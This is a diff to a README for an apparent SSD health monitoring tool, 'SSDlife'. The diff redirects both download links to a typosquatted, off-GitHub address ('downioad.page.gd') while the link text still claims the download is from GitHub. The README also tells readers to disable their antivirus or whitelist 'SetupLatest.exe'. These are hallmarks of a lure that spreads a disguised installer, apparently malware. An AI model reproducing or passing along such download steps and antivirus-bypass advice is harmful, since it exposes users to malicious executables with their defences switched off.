@@ -2,7 +2,7 @@
 
 SSDlife is a comprehensive desktop application designed to monitor the health, performance, and lifespan of your SSD drives. Built for Windows 10 and 11, it provides real-time insights and easy-to-understand reports to help you maintain your storage devices effectively.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 - **Real-Time Health Monitoring**: Track SSD temperature, wear levels, and health status with live updates.
@@ -43,7 +43,7 @@ SSDlife is a comprehensive desktop application designed to monitor the health, p
   Some antivirus tools may flag the installer due to heuristics. Temporarily disable your antivirus or add an exception for "SetupLatest.exe" to proceed with installation safely.
 
 ## Download
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Last Updated
 This documentation was last updated in 2026 to reflect the latest features and system compatibility.
